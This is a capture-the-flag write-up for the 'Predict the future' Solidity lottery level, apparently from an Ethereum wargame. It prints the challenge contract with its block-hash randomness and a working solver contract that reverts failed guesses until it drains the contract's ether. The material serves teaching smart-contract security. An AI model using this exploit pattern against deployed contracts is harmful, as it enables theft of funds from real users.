# Predict the future
<sup>LOTTERIES: 500 POINTS</sup>

This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.

Note that it is indeed possible to solve this challenge without losing any ether.

```solidity
pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

Enjoy this inspirational music while you work: [I Predict](https://youtu.be/TH5USLpPa_0).



`uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; -> At most 10 numbers`

```solidity
pragma solidity ^0.4.21;

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
    function isComplete() external view returns(bool);
}

contract PredictTheFutureSolver {
    
    IPredictTheFutureChallenge public challenge;
    address public owner;

    event challengeSolved(uint256 balance);

    constructor(address challengeAddress) public {
        challenge = IPredictTheFutureChallenge(challengeAddress);
        owner = msg.sender;
    }

    function withdraw() public payable {
        require(msg.sender == owner, "Only owner can withdraw funds");
        msg.sender.transfer(address(this).balance);
    }

    function lockNumber(uint8 n) public payable {
        challenge.lockInGuess.value(1 ether)(n);
    }
    
    function settleChallenge() public payable {
        challenge.settle();
        require(challenge.isComplete(), "Wrong answer");
        emit challengeSolved(address(this).balance);
    }

    function() external payable {}

}
```

Lock a number then use the `settleChallenge` function, if the solution is not correct you won't loose any ETH since if the `require(challenge.isComplete())` fails it will revert the execution.
